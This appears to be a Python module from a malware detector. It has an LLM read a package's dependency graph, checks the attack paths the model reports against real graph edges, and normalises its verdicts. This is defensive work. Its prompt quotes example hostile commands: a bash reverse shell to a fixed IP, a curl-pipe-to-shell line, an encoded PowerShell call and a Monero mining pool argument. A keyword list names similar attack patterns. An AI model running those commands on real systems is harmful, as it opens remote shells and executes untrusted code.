# -*- coding: utf-8 -*-
"""LLM 直接读图找攻击链（Graph-native analysis）

与现有包级 LLM 的区别：
- 现有：先由 API 正则筛出「可疑函数」，再让 LLM 看那 4 个函数的代码
   → LLM 的判断被正则的召回率卡死（正则没筛到的，LLM 永远看不到）
- 本模块：把**整张图**（压缩后）交给 LLM，让它自己找路径
   → 摆脱 API 名单粒度，能发现跨函数、非标准 API 的隐藏链

防幻觉（关键）：
LLM 输出的每条路径都必须通过 graph_digest.verify_paths()：
节点 ID 必须存在、相邻节点之间必须真有边。任一步不成立即作废。
因此"链"永远是图中真实存在的结构，LLM 只负责**指出**它，不负责**编造**它。
"""
import json
import re
from typing import Dict, List, Optional, Set

from src.graph_digest import digest, verify_paths

PROMPT = """You are a malware analyst. Below is a program dependency graph of a
Python package, extracted statically. Find data-flow paths that indicate
malicious behavior.

## Graph
{digest}

## Work in three steps (do them internally, then output only the JSON)

STEP 1 — Identify entry points: nodes where data enters the program from
outside (network responses, file/disk reads, environment, arguments, decoded
or deserialized blobs, literal payloads embedded in the code).

STEP 2 — Identify sensitive operations: nodes that execute code or commands,
spawn processes, send data out, write to disk, or change privileges.

STEP 3 — For each (entry, operation) pair that plausibly belongs to the same
flow, walk the graph edge by edge and record the EXACT edges you traverse.

## Hard rules
- **Node IDs are assigned randomly; they carry NO structural meaning.**
  N5 is not "next to" N6. Consecutive numbering is a serializer artifact.
  The ONLY source of truth for connectivity is the EDGES / STRUCT-EDGES lists.
  Never build a path from sequential IDs.
- Every hop you report must be an edge that literally appears in the lists.
  If you cannot find the next edge, STOP the path there — a shorter true path
  is far more useful than a longer guessed one.
- Only use node IDs that appear under NODES. Do not invent IDs.
- Report the **nodes** of the path in order (not the edge objects). The
  verifier will re-check every hop against the edge lists — so keep the path
  short and make sure each consecutive pair is a real edge.
- A dangerous API name alone is NOT evidence (a literal `subprocess.run(['ls'])`
  is routine). Judge the *flow*: where does the data come from, where does it go.
- Cross-file / cross-function flows matter most — report them even if long.
- **Hard-coded payload = single-node evidence. This is a RULE, not an option.**
  If a dangerous operation takes a **literal constant** (not a variable) that is
  itself hostile content, the operation alone is the attack:
    * `subprocess.Popen("bash -i >& /dev/tcp/1.2.3.4/7777 <&1")`  → reverse shell
    * `subprocess.Popen("powershell -EncodedCommand cABv...")`     → hidden payload
    * `os.system("curl http://x/y | sh")`                          → remote execution
    * `subprocess.Popen([..., "-o", "pool.supportxmr.com:443"])`   → crypto miner
    * `exec(b"...embedded code...")`                                → inline payload
  For these, DO NOT search for an upstream node. Output the path as a single
  node and state in why_malicious what the literal payload does.
  This applies especially inside setup.py / install hooks, where there is no
  data flow at all — the payload is simply executed.
  **The digest lists such nodes explicitly under
  "## ISOLATED PAYLOAD NODES". Every node in that section is a candidate —
  evaluate each one and report the hostile ones as single-node paths.**
- If no flow is malicious, return an empty paths list. Do not pad.

## Example of a valid single-node finding
Graph contains:
  N10  [expression]  L11  os.system("bash -c 'bash -i >& /dev/tcp/1.2.3.4/7777 <&1'")
Report:
  {{"nodes": ["N10"], "behavior": "reverse_shell",
   "why_malicious": "hard-coded reverse shell to a fixed attacker IP; the
    command alone is an attack, no data flow required"}}
This is correct even though N10 has no incoming edge.

## Output (JSON only, no prose outside the JSON)
```json
{{
  "entry_points": ["id", "..."],
  "sensitive_ops": ["id", "..."],
  "paths": [
    {{"nodes": ["src_id", "mid_id", "sink_id"],
      "behavior": "short name e.g. remote_payload_execution",
      "why_malicious": "one sentence tied to the actual code in those nodes"}}
  ],
  "verdict": "MALICIOUS|SUSPICIOUS|BENIGN",
  "confidence": 0.0,
  "reasoning": "at most 3 sentences"
}}
```
Keep the whole output under 600 tokens: short behavior names, one-sentence
explanations, at most 3 paths.
"""


def _parse_json(text: str) -> Optional[Dict]:
    """宽松 JSON 解析（2026-11，UNKNOWN 率驱动）。

    模型输出常见三种损坏：
      1. 前后带散文/markdown —— 正则提取即可
      2. 末尾被 max_tokens 截断 —— 逐字符回退补齐括号
      3. 尾随逗号 / 单引号 —— 规范化后再试
    每一步失败都进入下一步，而不是直接放弃。之前 269 节点的包
    （digest 12K 字符）经常在第 2 种情况直接返回 None → UNKNOWN。
    """
    if not text:
        return None
    m = re.search(r'```json\s*(.*?)\s*```', text, re.DOTALL)
    raw = m.group(1) if m else text
    # 截断的 JSON 没有闭合的 }——先试完整匹配，再退化为"从第一个 { 开始"
    m2 = re.search(r'\{.*\}', raw, re.DOTALL)
    if m2:
        cand = m2.group()
    else:
        start = raw.find('{')
        cand = raw[start:] if start >= 0 else ''

    # 直接解析
    try:
        return json.loads(cand)
    except Exception:
        pass

    # 截断修复（2026-11）：max_tokens 截断的输出。
    # 策略从简到繁：直接闭合 → 闭引号+括号 → 逐步回退。
    # （复杂版的 last_safe 回退实测会把悬挂字符串截过头，反而失败。）
    def _try(s: str) -> Optional[Dict]:
        try:
            d = json.loads(s)
            return d if isinstance(d, dict) and ('verdict' in d or 'paths' in d) else None
        except Exception:
            return None

    def _balance2(frag: str) -> Optional[Dict]:
        # 1) 原样（可能刚好完整）
        r = _try(frag)
        if r:
            return r
        # 2) 闭悬挂引号 + 补括号（处理 "...exec 这种字符串中间截断）
        in_str = False
        esc = False
        stack = []
        for ch in frag:
            if esc:
                esc = False
                continue
            if ch == chr(92):
                if in_str:
                    esc = True
                continue
            if ch == '"':
                in_str = not in_str
                continue
            if in_str:
                continue
            if ch in '{[':
                stack.append(ch)
            elif ch in '}]':
                if stack:
                    stack.pop()
        suffix = '"' if in_str else ''
        suffix += ''.join('}' if c == '{' else ']' for c in reversed(stack))
        # 尾随逗号去掉
        trimmed = frag.rstrip().rstrip(',')
        r = _try(trimmed + suffix)
        if r:
            return r
        # 3) 逐步回退（最后 1~300 字符逐步砍，每砍一次试一次）
        for cut in range(len(frag) - 1, max(len(frag) - 400, 0), -1):
            piece = frag[:cut].rstrip().rstrip(',')
            if piece == frag:
                continue
            # 重新平衡
            in_str = False
            esc = False
            stack = []
            for ch in piece:
                if esc:
                    esc = False
                    continue
                if ch == chr(92):
                    if in_str:
                        esc = True
                    continue
                if ch == '"':
                    in_str = not in_str
                    continue
                if in_str:
                    continue
                if ch in '{[':
                    stack.append(ch)
                elif ch in '}]':
                    if stack:
                        stack.pop()
            suf = ('"' if in_str else '') + ''.join(
                '}' if c == '{' else ']' for c in reversed(stack))
            r = _try(piece + suf)
            if r:
                return r
        return None

    for cut_len in (len(cand), len(cand) - 500, len(cand) - 1500, 2000):
        if cut_len <= 0 or cut_len > len(cand):
            continue
        r = _balance2(cand[:cut_len])
        if r:
            return r

    # 尾随逗号修复
    try:
        fixed = re.sub(r',\s*([}\]])', r'\1', cand)
        return json.loads(fixed)
    except Exception:
        return None


def _auto_anchors(nodes: List[Dict], edges: List[Dict],
                  max_anchors: int = 24) -> Set[str]:
    """挑选排序锚点（只影响展示优先级，不参与判定）。

    优先用敏感操作节点（is_dangerous）作为锚点——它们通常位于攻击链末端。
    没有敏感节点时退回"图枢纽"（度数最高的节点）：数据流通常经过它们。
    锚点数设上限，否则等于没有优先级（大包可能有几百个敏感节点）。
    """
    dangerous = [n for n in nodes if n.get('is_dangerous') and n.get('node_id')]
    if dangerous:
        # 2026-11 修复：锚点不能按 severity/代码长度排——
        # 实测 requess-2.27.1（含 XMRig 挖矿）：4085 节点里 1120 个被标
        # is_dangerous（27%，pattern_matcher 误标严重），而误标节点的
        # docstring 长、代码长，按「严重度+长度」排序时把真正的挖矿节点
        # （subprocess.Popen + pool.supportxmr.com）挤出了 24 个名额。
        # 改为按**高危特征命中数**排序：真恶意代码几乎必然命中多项。
        _HIGH_RISK = (
            'subprocess', 'os.system', 'os.popen', 'popen', 'exec(', 'eval(',
            'compile(', 'socket.', '/dev/tcp', 'supportxmr', 'stratum', 'xmr',
            'b64decode', 'urlopen', 'requests.post', 'requests.put',
            'curl ', 'wget ', 'chmod ', 'setuid', 'ld_preload', 'ctypes',
            'encodedcommand', 'powershell', 'base64',
        )

        def _risk_score(n):
            code = (n.get('code') or '').lower()
            hits = sum(1 for p in _HIGH_RISK if p in code)
            sev = {'critical': 0, 'high': 1}.get((n.get('severity') or '').lower(), 2)
            return (-hits, sev, -len(code))

        dangerous.sort(key=_risk_score)
        return {n['node_id'] for n in dangerous[:max_anchors]}

    deg: Dict[str, int] = {}
    for e in edges:
        a, b = e.get('from_node'), e.get('to_node')
        if a:
            deg[a] = deg.get(a, 0) + 1
        if b:
            deg[b] = deg.get(b, 0) + 1
    if not deg:
        return set()
    top = sorted(deg.items(), key=lambda kv: -kv[1])[:max_anchors]
    return {k for k, _ in top}


def analyze(nodes: List[Dict], edges: List[Dict], client, model: str,
            max_nodes: int = 700, max_digest_chars: int = 14000,
            show_danger: bool = False, samples: int = 1,
            priority_nodes: Set[str] = None,
            boundary_edges: Optional[Dict] = None) -> Dict:
    """让 LLM 读图找链，并验证它给出的链是否真实存在。

    verdict 与路径**解耦**（2026-11 真实样本驱动）：
      - verdict 是 LLM 的语义判断，独立有效
      - valid_paths 是结构验证通过的路径 → 可作强证据升级
      - rejected_paths 结构不成立 → 仅作解释，不参与升级
    早期版本要求"路径验证失败则整个分析作废"，会丢掉 LLM 完全正确的
    语义判断（真实案例：LLM 准确指出 encoded PowerShell，但把同语句的
    CREATE_NO_WINDOW 当作下一步，边不存在）。

    Returns:
        {
          'verdict': str, 'confidence': float, 'reasoning': str,
          'valid_paths': [...],        # 通过图验证的路径（真实 node_id）
          'rejected_paths': [...],     # 被防幻觉校验拒绝的（带 reason）
          'llm_used': bool,
          'error': str | None,
        }
    """
    text, s2r = digest(nodes, edges, max_nodes=max_nodes,
                       boundary_edges=boundary_edges)
    if len(text) > max_digest_chars:
        # 超预算：按行截断（NODES 优先保留，EDGES 尽量保留）
        text = text[:max_digest_chars] + '\n## (digest truncated)'

    prompt = PROMPT.format(digest=text)

    def _once(temp: float):
        resp = client.chat.completions.create(
            model=model,
            messages=[
                {"role": "system", "content":
                 "You are a senior malware analyst reading a dependency graph. "
                 "You must only reference node IDs present in the graph, and "
                 "only connect nodes that share an explicit edge."},
                {"role": "user", "content": prompt},
            ],
            temperature=temp, max_tokens=3500,
        )
        return resp.choices[0].message.content if resp.choices else ''

    try:
        out = _once(0.1)
    except Exception as e:
        return {'verdict': 'UNKNOWN', 'confidence': 0.0, 'reasoning': '',
                'valid_paths': [], 'rejected_paths': [], 'llm_used': False,
                'error': f'{type(e).__name__}: {e}'}

    data = _parse_json(out)
    if not data:
        # 弱模型输出不稳定（同输入两次调用可能一次是 JSON、一次是散文）。
        # 重试一次，用更硬的约束：只要 JSON，不要任何解释性文字。
        try:
            resp2 = client.chat.completions.create(
                model=model,
                messages=[
                    {"role": "system", "content":
                     "Output ONLY a JSON object. No prose, no markdown fences, "
                     "no explanation before or after."},
                    {"role": "user", "content": prompt},
                ],
                temperature=0.0, max_tokens=3500,
            )
            out2 = resp2.choices[0].message.content if resp2.choices else ''
            data = _parse_json(out2)
        except Exception:
            data = None
    if not data:
        # 第三次重试（2026-11，UNKNOWN 率驱动）：最小输出格式。
        # 前两次失败多为长 JSON 的格式损坏；只问 verdict 规避一切结构问题。
        try:
            resp3 = client.chat.completions.create(
                model=model,
                messages=[
                    {"role": "system", "content":
                     'Reply with exactly one word: MALICIOUS, SUSPICIOUS, or BENIGN.'},
                    {"role": "user", "content":
                     prompt + chr(10) * 2 +
                     "For this task, ignore the JSON format above. "
                     "Analyze the graph, then answer with exactly one word: "
                     "MALICIOUS, SUSPICIOUS, or BENIGN."},
                ],
                temperature=0.0, max_tokens=10,
            )
            word = (resp3.choices[0].message.content or '').strip().upper()
            for k in ('MALICIOUS', 'SUSPICIOUS', 'BENIGN'):
                if k in word:
                    data = {'verdict': k, 'paths': [], 'confidence': 0.5,
                            'reasoning': 'minimal-format retry'}
                    break
        except Exception:
            pass
    if not data:
        return {'verdict': 'UNKNOWN', 'confidence': 0.0, 'reasoning': '',
                'valid_paths': [], 'rejected_paths': [], 'llm_used': True,
                'error': 'json_parse_failed',
                'demoted_no_structural_support': False}

    valid, rejected = verify_paths(data.get('paths') or [], nodes, edges, s2r)

    # 判决值归一化（2026-11，UNKNOWN 率驱动）
    # 模型常输出变体词（UNCERTAIN / LIKELY_MALICIOUS / CLEAN…），
    # 早期实现只认三个精确值，其余一律 UNKNOWN——实测 269 节点的包
    # 单独跑能给出 MALICIOUS，批量里却因输出变体词变成 UNKNOWN。
    _raw_v = str(data.get('verdict') or '').strip().upper().replace(' ', '_')
    _VERDICT_MAP = {
        'MALICIOUS': 'MALICIOUS', 'MALWARE': 'MALICIOUS', 'ATTACK': 'MALICIOUS',
        'MALICIOUS_PACKAGE': 'MALICIOUS', 'IS_MALICIOUS': 'MALICIOUS',
        'SUSPICIOUS': 'SUSPICIOUS', 'UNCERTAIN': 'SUSPICIOUS',
        'POSSIBLY_MALICIOUS': 'SUSPICIOUS', 'LIKELY_MALICIOUS': 'SUSPICIOUS',
        'POTENTIALLY_MALICIOUS': 'SUSPICIOUS', 'MAYBE': 'SUSPICIOUS',
        'BENIGN': 'BENIGN', 'CLEAN': 'BENIGN', 'SAFE': 'BENIGN',
        'NOT_MALICIOUS': 'BENIGN', 'LEGITIMATE': 'BENIGN', 'NO_RISK': 'BENIGN',
    }
    verdict = _VERDICT_MAP.get(_raw_v)
    if not verdict:
        # 未知词 → 用结构证据推断（有验证通过的路径即视为可疑）
        verdict = 'SUSPICIOUS' if valid else 'BENIGN'

    # ===== 多次采样投票（2026-11，弱模型抖动驱动）=====
    # glm-4-flash 对同一输入多次调用判决会抖动（复现：同一恶意包一次
    # MALICIOUS、一次 SUSPICIOUS）。samples>1 时额外采样并取多数，
    # 但只在"结构证据存在"或"判决不确定"时做——纯 BENIGN 且无路径
    # 的样本不需要花这个钱。
    votes = [verdict]
    all_valid = list(valid)
    if samples > 1:
        for i in range(samples - 1):
            try:
                out_i = _once(0.3)   # 略高温度，让采样有区分度
            except Exception:
                continue
            data_i = _parse_json(out_i)
            if not data_i:
                continue
            v_i = str(data_i.get('verdict', 'UNKNOWN')).upper()
            if v_i not in ('MALICIOUS', 'SUSPICIOUS', 'BENIGN'):
                continue
            valid_i, _rej_i = verify_paths(data_i.get('paths') or [], nodes, edges, s2r)
            if v_i == 'MALICIOUS' and not valid_i:
                # 2026-11 修正：这类采样应**弃权**而非投反对票。
                # 高温采样更容易产出幻觉路径被验证拒绝；若把它记成
                # SUSPICIOUS，多采样反而会拉低召回（实测 libedgui:
                # samples=1 判 MALICIOUS，samples=3 变成 SUSPICIOUS）。
                # "有判断但结构不成立" = 该样本无信息量，不计票。
                continue
            votes.append(v_i)
            all_valid.extend(valid_i)
        if votes:
            cnt = {}
            for v in votes:
                cnt[v] = cnt.get(v, 0) + 1
            verdict = max(cnt, key=lambda k: (cnt[k], k == 'MALICIOUS'))
            confidence = round(cnt.get(verdict, 0) / len(votes), 2)

    # ===== 结构支撑门控（2026-11，真实误报驱动）=====
    # LLM 读图后若无一条**验证通过**的路径却判 MALICIOUS，说明它的判断
    # 没有落在图结构上——真实案例：ably（良性库）被判 MALICIOUS conf 0.9，
    # 但唯一路径因边不存在被拒。这类判决必须降级：
    #   MALICIOUS + 无有效路径 → SUSPICIOUS
    # 反之，有有效路径但 LLM 保守（libedgui 有路径却判 SUSPICIOUS）
    # 保留 LLM 的保守判断，不强行上调——避免单路径伪证。
    demoted = False
    if verdict == 'MALICIOUS' and not valid:
        verdict = 'SUSPICIOUS'
        demoted = True

    return {
        'verdict': verdict,
        'confidence': float(data.get('confidence') or 0.0),
        'reasoning': (data.get('reasoning') or '')[:400],
        'valid_paths': valid,
        'rejected_paths': rejected,
        'demoted_no_structural_support': demoted,
        'llm_used': True,
        'error': None,
    }


def format_paths(paths: List[Dict], nodes: List[Dict], limit: int = 3) -> str:
    """把验证通过的路径渲染成可读文本（用于报告/上游 prompt）"""
    by_id = {n.get('node_id'): n for n in nodes if n.get('node_id')}
    out = []
    for p in paths[:limit]:
        out.append(f"* {p.get('behavior', '?')}: {p.get('why_malicious', '')[:160]}")
        for nid in (p.get('nodes') or []):
            n = by_id.get(nid) or {}
            out.append(f"    {nid}  {n.get('file', '')}:{n.get('line', 0)}  "
                       f"{(n.get('code') or '')[:90]}")
    return '\n'.join(out)
